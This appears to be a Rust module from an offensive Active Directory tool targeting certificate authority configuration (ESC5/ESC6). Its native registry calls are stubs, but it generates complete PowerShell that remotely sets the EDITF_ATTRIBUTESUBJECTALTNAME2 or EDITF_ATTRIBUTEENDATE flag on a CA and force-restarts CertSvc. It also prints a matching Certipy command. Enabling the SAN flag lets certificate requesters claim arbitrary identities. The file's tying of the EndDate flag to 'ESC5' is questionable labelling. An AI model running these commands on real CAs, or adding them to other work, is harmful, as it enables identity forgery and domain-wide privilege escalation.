//! ESC5 and ESC6 (CA Registry Configuration)
//!
//! Exposes capabilities to read and write CA registry configuration,
//! specifically targeting the EDITF_ATTRIBUTEENDATE and
//! EDITF_ATTRIBUTESUBJECTALTNAME2 flags which lead to ESC6/ESC5.

use crate::error::{OverthroneError, Result};
use crate::proto::registry::{PredefinedHive, RemoteRegValue, RemoteRegistry};
use std::net::SocketAddr;
use tracing::{info, warn};

/// Target for ESC5/ESC6 CA configuration abuse
pub struct Esc5Target {
    pub ca_server: String,
    pub ca_name: String,
}

impl Esc5Target {
    /// Create a new ESC5/ESC6 registry target
    pub fn new(ca_server: impl Into<String>, ca_name: impl Into<String>) -> Self {
        Self {
            ca_server: ca_server.into(),
            ca_name: ca_name.into(),
        }
    }

    /// Read the EDITF flags from the registry
    ///
    /// The flags are located at:
    /// HKLM\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\<CA Name>\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags
    pub async fn read_edit_flags(&self) -> Result<u32> {
        info!("Reading CA configuration via Remote Registry...");

        // This is a stub for the actual TCP/SMB RPC connection.
        // In a full implementation, we would:
        // 1. Establish SMB tree connect to IPC$
        // 2. Bind to WINREG RPC
        // 3. call OpenLocalMachine
        // 4. call OpenKey
        // 5. call QueryValue

        // For now, we generate the PowerShell equivalent.
        let ps_cmd = self.generate_read_command();
        warn!(
            "Native Remote Registry RPC transport is not fully wired yet. Use command generation:"
        );
        info!("{}", ps_cmd);

        Err(OverthroneError::Adcs(
            "Native remote registry requires SMB transport implementation".into(),
        ))
    }

    /// Write the EDITF_ATTRIBUTESUBJECTALTNAME2 flag (ESC6)
    pub async fn enable_san_flag(&self) -> Result<()> {
        info!("Enabling EDITF_ATTRIBUTESUBJECTALTNAME2 via Remote Registry...");
        let ps_cmd = self.generate_write_command();
        warn!(
            "Native Remote Registry RPC transport is not fully wired yet. Use command generation:"
        );
        info!("{}", ps_cmd);

        Err(OverthroneError::Adcs(
            "Native remote registry requires SMB transport implementation".into(),
        ))
    }

    /// Generate the Certipy/PowerShell command to check the EDITF flags
    pub fn generate_read_command(&self) -> String {
        format!(
            "# Read EditFlags registry value for CA '{}' on server '{}'\n\
            $RegPath = \"SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\{}\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\"\n\
            Invoke-Command -ComputerName '{}' -ScriptBlock {{\n\
                (Get-ItemProperty -Path \"HKLM:\\$using:RegPath\" -Name \"EditFlags\").EditFlags\n\
            }}",
            self.ca_name, self.ca_server, self.ca_name, self.ca_server
        )
    }

    /// Generate the Certipy/PowerShell command to modify the EDITF flags for ESC6
    pub fn generate_write_command(&self) -> String {
        format!(
            "# Enable EDITF_ATTRIBUTESUBJECTALTNAME2 and restart CertSvc for CA '{}'\n\
            $RegPath = \"SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\{}\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\"\n\
            Invoke-Command -ComputerName '{}' -ScriptBlock {{\n\
                $Flags = (Get-ItemProperty -Path \"HKLM:\\$using:RegPath\" -Name \"EditFlags\").EditFlags\n\
                $NewFlags = $Flags -bor 0x00040000 # EDITF_ATTRIBUTESUBJECTALTNAME2\n\
                Set-ItemProperty -Path \"HKLM:\\$using:RegPath\" -Name \"EditFlags\" -Value $NewFlags\n\
                Restart-Service -Name CertSvc -Force\n\
                Write-Host \"[+] Successfully enabled SAN flag and restarted CertSvc\"\n\
            }}\n\
            \n\
            # Alternative using Certipy:\n\
            # certipy ca -ca '{}' -target '{}' -config -enable-san",
            self.ca_name, self.ca_name, self.ca_server, self.ca_name, self.ca_server
        )
    }

    /// Generate the Certipy/PowerShell command to modify the EDITF flags for ESC5 (validity period)
    pub fn generate_enddate_command(&self) -> String {
        format!(
            "# Enable EDITF_ATTRIBUTEENDATE and restart CertSvc for CA '{}'\n\
            $RegPath = \"SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\{}\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy\"\n\
            Invoke-Command -ComputerName '{}' -ScriptBlock {{\n\
                $Flags = (Get-ItemProperty -Path \"HKLM:\\$using:RegPath\" -Name \"EditFlags\").EditFlags\n\
                $NewFlags = $Flags -bor 0x00000040 # EDITF_ATTRIBUTEENDATE\n\
                Set-ItemProperty -Path \"HKLM:\\$using:RegPath\" -Name \"EditFlags\" -Value $NewFlags\n\
                Restart-Service -Name CertSvc -Force\n\
                Write-Host \"[+] Successfully enabled EndDate flag and restarted CertSvc\"\n\
            }}",
            self.ca_name, self.ca_name, self.ca_server
        )
    }
}
